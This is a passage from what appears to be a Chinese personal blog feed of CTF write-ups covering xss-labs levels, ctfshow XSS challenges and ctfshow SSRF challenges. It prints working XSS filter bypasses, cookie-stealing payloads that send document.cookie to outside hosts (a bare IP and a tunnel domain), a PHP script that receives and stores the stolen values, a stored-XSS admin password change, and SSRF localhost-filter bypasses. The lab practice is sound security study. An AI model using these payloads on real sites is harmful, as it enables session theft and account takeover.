class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onmousemove=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><p>改Cookie为</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span><span class="hljs-operator">=</span><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onmousemove=&quot;</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="level-14（exif-xss）"><a href="#level-14（exif-xss）" class="headerlink" title="level-14（exif xss）"></a><strong>level-14（exif xss）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AISXK.png" alt="image-20231031164108718"></p><p>正常需要网站操作，网站崩了</p><p><strong>可交换图像文件格式</strong>（英语：Exchangeable image file format，官方简称<strong>Exif</strong>），是专门为<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E7%A0%81%E7%9B%B8%E6%9C%BA">数码相机</a>的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。</p><p>payload：</p><p><img src="https://i0.imgs.ovh/2023/10/31/AIuB2.jpeg" alt="img"></p><h2 id="level-15（ng-include包含）"><a href="#level-15（ng-include包含）" class="headerlink" title="level-15（ng-include包含）"></a><strong>level-15（ng-include包含）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIOvI.png" alt="image-20231031164617749"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">AngularJS ng-<span class="hljs-meta"><span class="hljs-keyword">include</span> 指令**</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">*ng-<span class="hljs-keyword">include</span>* 指令用于包含外部的 HTML 文件。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">包含的内容将作为指定元素的子节点。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">*ng-<span class="hljs-keyword">include</span>* 属性的值可以是一个表达式，返回一个文件名。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">默认情况下，包含的文件需要包含在同一个域名下。也就相当于php里面的<span class="hljs-keyword">include</span>。</span><br><span class="hljs-meta"></span><br></code></pre></td></tr></table></figure><p>将之前关卡进行包含，然后通过该关卡触发弹窗，触发level-15关的通关条件。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>edf89bf-<span class="hljs-number">3</span>f9d-<span class="hljs-number">4825</span>-b2b2-<span class="hljs-number">9</span>c15a35f7c0d.node4.buuoj.cn:<span class="hljs-number">81</span>/level15.php?src=%<span class="hljs-number">27</span>level2.php%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>但转至第三关</p><p>因为引用了第一关源代码，当搜索框中点击提交，会显示回显的页面，这个时候由于代码植入到了查询结果页面，所以触发了弹窗，导致直接触发了其本身的函数。跳转到了第三关当中。</p><p>既然可以引用页面，那可不可以<strong>引用一个在页面解析过程中就会直接运行*alert*函数的页面</strong>呢？</p><p>访问<em>level2.php</em>在页面解析的时候就插入一张图片，故意写错src地址，请求不到相应的图片会报错，<em>onerror</em>触发<em>alert</em>函数。这就不存在跳转的问题了。</p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>edf89bf-<span class="hljs-number">3</span>f9d-<span class="hljs-number">4825</span>-b2b2-<span class="hljs-number">9</span>c15a35f7c0d.node4.buuoj.cn:<span class="hljs-number">81</span>/level15.php?src=&#x27;level1.php?name=&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-number">1</span>)&gt;&#x27;<br></code></pre></td></tr></table></figure><h2 id="level-16（-0d回车换行绕过）"><a href="#level-16（-0d回车换行绕过）" class="headerlink" title="level-16（%0d回车换行绕过）"></a><strong>level-16（%0d回车换行绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIdRA.png" alt="image-20231031165950153"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>替换了<em>script、&#x2F;、空格</em>，只能用<em>onerror、onblur</em>这类型的函数进行绕过了。</p><p>1、“0D”是把光标移到同一行的顶头——回车(CR)。</p><p>2、“0A”是把光标移到下一行——换行(LF)。</p><p>使用替身，就是将%0a或者%0D当成空格使用，在HTML中这样是合法的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?keyword=&lt;img%0dsrc=1%0donerror=alert(1)&gt;<br></code></pre></td></tr></table></figure><h2 id="level-17（onmouseover标签的灵活运用）"><a href="#level-17（onmouseover标签的灵活运用）" class="headerlink" title="level-17（onmouseover标签的灵活运用）"></a><strong>level-17（onmouseover标签的灵活运用）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AhXnT.png" alt="image-20231031171437870"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br></code></pre></td></tr></table></figure><p>GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后复制给<code>embed</code>标签的<code>src</code>值。</p><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，就能有块错误的区域</p><p>可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02=b <span class="hljs-attribute">onmousemove</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="level-18（拼接绕过）"><a href="#level-18（拼接绕过）" class="headerlink" title="level-18（拼接绕过）"></a><strong>level-18（拼接绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AhfHW.png" alt="image-20231031172003900"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level18<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="hljs-meta">echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>与上一关同理</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02=b <span class="hljs-attribute">onmousemove</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="level-19（flash-xss）不会"><a href="#level-19（flash-xss）不会" class="headerlink" title="level-19（flash xss）不会"></a><strong>level-19（flash xss）</strong>不会</h2><p><img src="https://i0.imgs.ovh/2023/10/31/Ahmov.png" alt="image-20231031172144223"></p><p>上两关payload不行了，源码把上面漏洞闭合了,加了一对双引号，绕不出去了</p><h2 id="level-20（flash-xss）"><a href="#level-20（flash-xss）" class="headerlink" title="level-20（flash xss）"></a><strong>level-20（flash xss）</strong></h2>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xsslabs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow xss</title>
    <link href="/2023/10/22/%E5%88%B7%E9%A2%98/ctfshow%20xss/"/>
    <url>/2023/10/22/%E5%88%B7%E9%A2%98/ctfshow%20xss/</url>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-xss"><a href="#ctfshow-xss" class="headerlink" title="ctfshow xss"></a>ctfshow xss</h1><p>做题前需要搭建网站接收flag</p><p>2.php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$flag</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>接收GET传来的参数，并写在flag.php中</p><p><a href="https://xz.aliyun.com/t/4067">xss总结</a></p><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://47.115.224.235/2.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打开flag.php，得到flag</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>过滤了script</p><p>利用body标签</p><p>由于这种攻击方法向量，在给定页面中只有一个body标签，有些人可能认为它不起作用，但实际上，所有浏览器都会把它当事件处理器（Event Handler）来执行。在这里，可以在onpageshow事件中用提交body元素的方法，形成XSS Payload，当其中的body元素被解析后就会触发Payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web318，319"><a href="#web318，319" class="headerlink" title="web318，319"></a>web318，319</h2><p>过滤了img，payload与317相同</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>过滤空格，使用&#x2F;绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;body/onload=&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><img src="https://i.imgs.ovh/2023/10/22/2dpKu.png" alt="image"></p><p>发件人和收件人都要填写admin，否则会发送失败</p><p>信的内容填写payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>注册账号，账号中填写payload语句，用这个账号登陆</p><p>后台管理员查看登录界面时，会执行js代码，将管理员cookie发出去</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>得到cookie后，bp抓包修改得到权限，可以查看flag</p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>该题得到cookie会快速失效，因此换一种姿势，我们的xss代码会在用户管理里执行，可以直接把flag发到我们服务器里</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">$(<span class="hljs-string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">index,value</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(value.<span class="hljs-property">innerHTML</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;ctfshow&#123;&#x27;</span>)==<span class="hljs-number">0</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;</span>+value.<span class="hljs-property">innerHTML</span>; </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>indexof 方法<a href="https://www.w3school.com.cn/jsref/jsref_indexOf.asp">https://www.w3school.com.cn/jsref/jsref_indexOf.asp</a></p><h2 id="web-330"><a href="#web-330" class="headerlink" title="web 330"></a>web 330</h2><p><img src="https://i.imgs.ovh/2023/10/22/2day2.png" alt="image"></p><p>借用修改密码界面尝试修改管理员密码</p><p>在用户名触发script语句</p><p>注册账号用户名填payload，密码123</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>用这个账号和密码去登录一下。登录完成后，管理员admin的密码就被成功修改成123了，此时即可成功登录。</p>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow ssrf</title>
    <link href="/2023/10/18/%E5%88%B7%E9%A2%98/ctfshow%20ssrf/"/>
    <url>/2023/10/18/%E5%88%B7%E9%A2%98/ctfshow%20ssrf/</url>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>存在&#x2F;flag.php</p><p>访问提示没有本地权限</p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/10/18/2rEsC.png" alt="image-20231018213400557"></p><p>curl_init — 初始化 cURL 会话</p><p>curl_setopt — 设置一个cURL传输选项</p><p>curl_exec — 执行 cURL 会话</p><p>curl_close — 关闭 cURL 会话</p><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><p>过滤127.0.0,localhost</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>正则匹配没有参数</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure><p>根据parse_url()函数的解析，这题还有各种姿势获得flag：</p><ul><li><p>127.1会被解析成127.0.0.1，也就意味着为零可缺省</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">127</span>.<span class="hljs-number">1</span>/flag.php<br></code></pre></td></tr></table></figure></li><li><p>在Linux中，0也会被解析成127.0.0.1</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure></li><li><p>127.0.0.0&#x2F;8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.255</span>.<span class="hljs-number">255.254</span>/flag.php<br></code></pre></td></tr></table></figure></li><li><p>ip地址还可以通过表示成其他进制的形式访问，<a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IP地址二进制、十进制、十六进制互换</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure></li></ul><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, 